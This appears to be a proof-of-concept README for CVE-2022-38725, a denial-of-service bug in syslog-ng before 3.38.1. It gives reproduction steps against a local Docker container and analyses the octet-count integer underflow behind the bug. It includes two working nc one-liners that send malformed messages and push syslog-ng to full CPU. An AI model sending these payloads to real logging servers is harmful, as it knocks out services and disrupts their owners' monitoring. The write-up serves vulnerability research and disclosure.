# CVE-2022-38725

CVE-2022-38725 is an unauthenticated Denial of Service vulnerability in syslog-ng versions prior to 3.38.1.

https://github.com/syslog-ng/syslog-ng/security/advisories/GHSA-7932-4fc6-pvmc

https://nvd.nist.gov/vuln/detail/CVE-2022-38725

## Steps to Reproduce

1. Pull a vulnerable docker image:

```
docker pull linuxserver/syslog-ng:3.36.1
```

2. Run a vulnerable syslog-ng container. Note other syslog configurations can be applied but the default settings are vulnerable:

```
docker run -p 514:5514/udp -p 601:6601/tcp --rm -it linuxserver/syslog-ng:3.36.1
```

3. Send the payload to the server:

```
echo '27 <182>2022-08-17T05:02:28.217 mymachine su: 'su root' failed for lonvick on /dev/pts/8' | nc 127.0.0.1 601 -w 1
```

4. On the vulnerable host notice that CPU has spiked to 100% for the syslog-ng process

![syslog-ng-CVE-2022-38725](https://github.com/user-attachments/assets/8bd57dfb-a5a3-4a24-acc5-36fb7cca57a6)

## Analysis

The [3.38.1 release](https://github.com/syslog-ng/syslog-ng/releases/tag/syslog-ng-3.38.1) links https://github.com/syslog-ng/syslog-ng/pull/4110, which includes unit tests and several validations to prevent similar variants of this bug.

The [original issue](https://github.com/syslog-ng/syslog-ng/issues/4277) includes helpful debugging that identified the root cause.

The GitHub advisory claims that the vulnerability occurs from improper parsing of RFC3164, which is the traditional BSD syslog format. The advisory explains that an integer underflow can occur and that no impact outside of availability is believed possible.

The pull request to fix the vulnerability adds unit test to both the RFC3164 and RFC5424 (newer syslog format) timestamp parsers.

Note that the RFC3164 spec defines the timestamp to match the `Oct 11 22:14:15` format, where RFC5424 uses the ISO format, `1985-04-12T19:20:50.52-04:00`. The unit cases indicate that the syslog-ng code attempts to parse either format. The GitHub advisory claims that the vulnerability occurs when parsing RFC3164 messages, which isn't fully accurate. RFC5424 messages are responsible for the variable length timestamp. Since the syslog protocol doesn't explicitly state a message type, the syslog-ng project attempted to parse both timestamps. This allows for an RFC3164 message with a malformed timestamp to trigger the vulnerability as well:

```
echo '21 <182>Oct 11 22:14:15.123 mymachine su: 'su root' failed for lonvick on /dev/pts/8' | nc 127.0.0.1 601 -w 1
```

The [syslog source](https://syslog-ng.github.io/dev-guide/chapter_4/section_2/macos-testing-status/afsocket/syslog-source-destination-driver) uses octet counting as described by RFC6587 which prefixes the syslog message with the number of bytes sent in TCP messages.

The vulnerability can be triggered by sending a message size that doesn't fully account for the ISO timestamp. The syslog-ng code iterates over the timestamp and subtracts the number of digits from the specified length. This mismatch allows for an underflow condition where the read length ends up becoming negative while there is still data to read from the message.

The process flows to a while loop where the process is stuck trying to read characters from message. This issue results in 100% CPU usage for the given process. An attacker is able to send multiple payloads to consume additional system resources.

Syslog does not use octet counting over UDP so the above payload has no unusual effect. Restarting the syslog-ng container/process does reset CPU usage.

## Additional

One of the syslog-ng maintainers indicated that it may be possible to trigger this through a [TCP RST](https://github.com/syslog-ng/syslog-ng/issues/4277#issuecomment-1377186809) in the middle of a message. It was noted that the message would need to send a partial timestamp prior to the TCP RST. This may allow for octet counting to be bypassed.
